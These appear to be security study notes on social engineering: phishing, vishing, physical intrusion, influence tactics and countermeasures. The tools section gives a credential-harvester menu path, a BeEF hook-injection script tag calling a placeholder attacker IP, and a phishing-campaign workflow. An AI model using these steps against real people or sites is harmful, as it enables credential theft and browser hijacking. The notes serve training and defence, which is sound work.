# 2. Social Engineering Attacks

## Table of Contents

- [Overview](#overview)
- [Phishing Attacks](#phishing-attacks)
- [Voice & SMS Attacks](#voice--sms-attacks)
- [Physical Attacks](#physical-attacks)
- [Other Attack Vectors](#other-attack-vectors)
- [Methods of Influence](#methods-of-influence)
- [Tools](#tools)
- [Countermeasures](#countermeasures)

---

## Overview

Social engineering exploits **human psychology** rather than technical vulnerabilities. The attacker manipulates people into revealing confidential information, granting access, or performing actions that compromise security.

```
                        SOCIAL ENGINEERING
                              |
            +-----------------+-----------------+
            |                 |                 |
        DIGITAL           VOICE/SMS         PHYSICAL
            |                 |                 |
     +------+------+     +---+---+      +------+------+
     |      |      |     |       |      |      |      |
  Phishing  Water  USB  Vishing Smish  Tailg  Dumpst  Shoulder
  Spear ph  Hole   Drop                ating  Diving  Surfing
  Whaling   Attack Key                 Badge
                                       Cloning
```

---

## Phishing Attacks

| Type | Target | Description |
|---|---|---|
| **Phishing** | Mass/general | Generic fraudulent emails impersonating trusted entities |
| **Spear Phishing** | Specific group/individual | Highly targeted, researched, personalized attack |
| **Whaling** | C-level executives / key individuals | Spear phishing directed at high-profile targets |

### Attack Flow

```
Attacker                          Victim
   |                                |
   |  1. Craft convincing email     |
   |  (spoofed sender, urgency)     |
   |------------------------------->|
   |                                |  2. Victim clicks link
   |                                |     or opens attachment
   |                                |
   |  3. Credential harvesting      |
   |     or malware delivery        |
   |<-------------------------------|
   |                                |
   |  4. Access to systems/data     |
   |                                |
```

### Key Indicators of Phishing

- Urgency or fear-based language
- Mismatched or suspicious sender domain
- Generic greetings ("Dear Customer")
- Spelling/grammar errors
- Suspicious links (hover to check actual URL)
- Unexpected attachments

---

## Voice & SMS Attacks

### Vishing (Voice Phishing)

Social engineering via **phone call**. The attacker persuades the victim to reveal private personal, financial, or corporate information.

**Common pretexts:**
- Fake bank fraud department
- IT support / help desk impersonation
- Government agency (IRS, tax office)

### Smishing (SMS Phishing)

Phishing via **SMS/text messages**. Typically contains a malicious link or asks for sensitive info via reply.

**Common pretexts:**
- Package delivery notification
- Account verification
- Prize/reward claims

### Call Spoofing Tools

| Tool | Platform | Capabilities |
|---|---|---|
| **SpoofApp** | iOS / Android | Spoof caller ID |
| **SpoofCard** | iOS / Android | Spoof number, voice changer, record calls, fake background noise, send to voicemail |
| **Asterisk** | Linux | Legitimate VoIP PBX — can impersonate caller ID |

---

## Physical Attacks

### Tailgating / Piggybacking

| Term | Description |
|---|---|
| **Piggybacking** | Unauthorized person follows an authorized person **with their consent** |
| **Tailgating** | Same as above but **without consent** |

**Countermeasure:** Access control vestibules (mantraps) — small space fitting one person, two sets of doors (first must close before second opens). Often combined with multifactor auth (proximity card + PIN + biometric).

### Dumpster Diving

Scavenging through **garbage and recycling** for sensitive documents, credentials, or hardware.

**Countermeasure:** Shred documents, destroy storage media, secure waste disposal.

### Shoulder Surfing

Observing someone's screen or keypad to capture **passwords, PINs, or PII**.

**Countermeasure:** Privacy screens, awareness of surroundings, angled monitors.

### Badge Cloning

Attacker **duplicates RFID/NFC** access cards to gain physical entry to buildings.

**Common tools:** Proxmark3, HID card cloners.

**Countermeasure:** Multi-factor physical auth, encrypted badges, anomaly detection on access logs.

### USB Drop Key

Attacker leaves **malicious USB drives** in strategic locations (parking lots, lobbies, break rooms). Victims plug them in out of curiosity, triggering malware installation.

**Common payloads:**
- Rubber Ducky scripts (keystroke injection)
- Auto-run malware
- Reverse shell droppers

**Countermeasure:** Disable USB auto-run, endpoint protection, security awareness training.

---

## Other Attack Vectors

### Watering Hole Attack

```
1. Attacker profiles victim's      2. Attacker finds vuln         3. Victim visits
   frequently visited websites         in one of those sites          compromised site
        +--------+                      +--------+                    +--------+
        | target |---browse--->         | vuln   |<--inject exploit-- | target |
        | victim |             website  | site   |                    | victim |
        +--------+                      +--------+                    +--------+
                                                                          |
                                                              4. Redirect (pivot)
                                                                 to exploit page
                                                                          |
                                                                          v
                                                                   +------------+
                                                                   | attacker's |
                                                                   | exploit    |
                                                                   | server     |
                                                                   +------------+
                                                                          |
                                                              5. Malware installed
                                                                 Foothold gained
```

**Key characteristics:**
- Targeted (not random — based on victim profiling)
- Compromises a **trusted** third-party site
- Uses redirect/pivot to deliver exploit
- Goal: gain foothold in target organization's network

---

## Methods of Influence

Attackers leverage psychological principles to manipulate victims:

| Principle | Description | Example |
|---|---|---|
| **Authority** | Impersonate someone in power | "I'm calling from IT, I need your password to fix your account" |
| **Scarcity & Urgency** | Create time pressure | "Your account will be locked in 1 hour" |
| **Social Proof** | People follow what others do | "Everyone in your department has already updated their credentials" |
| **Likeness** | Build rapport / similarity | Mirroring language, shared interests, flattery |
| **Fear** | Threaten negative consequences | "If you don't act now, you'll lose access permanently" |
| **Reciprocity** | Offer something first | Give a small "favor" then ask for sensitive info |
| **Trust** | Exploit existing relationship | Compromise a known contact's email and message from it |

---

## Tools

### Social Engineering Toolkit (SET)

Full-featured framework for social engineering attacks.

```bash
# Launch SET
sudo setoolkit

# Main menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules

# Common attack vectors within SET:
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors         (credential harvester, tabnabbing)
# 3) Infectious Media Generator      (USB payloads)
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack

# Example: Credential Harvester
# 1 > 2 > 3 > 2 (Site Cloner) > enter target URL
```

### Browser Exploitation Framework (BeEF)

Focuses on **browser-based** attack vectors. Hooks victim browsers via XSS or injected JavaScript.

```bash
# Start BeEF
sudo beef-xss

# Default panel: http://127.0.0.1:3000/ui/panel
# Hook URL:     http://<attacker-ip>:3000/hook.js
#
# Inject hook.js into a page the victim will visit:
# <script src="http://<attacker-ip>:3000/hook.js"></script>
```

### Gophish (Phishing Campaigns)

Open-source phishing simulation platform — useful for both red team and awareness training.

```bash
# Download and run
./gophish

# Web UI: https://127.0.0.1:3333
# Default creds: admin / gophish (change immediately)
#
# Workflow:
# 1. Create sending profile (SMTP)
# 2. Create email template
# 3. Create landing page (credential harvest)
# 4. Define user group (targets)
# 5. Launch campaign
```

---

## Countermeasures

| Layer | Countermeasure |
|---|---|
| **People** | Security awareness training, phishing simulations, reporting culture |
| **Email** | SPF, DKIM, DMARC records; email filtering; link sandboxing |
| **Physical** | Mantraps, badge policies, visitor escort, shredding, camera surveillance |
| **Endpoint** | Disable USB auto-run, application whitelisting, EDR |
| **Network** | Web proxy filtering, DNS filtering, network segmentation |
| **Process** | Verification procedures for sensitive requests (callback, dual approval) |
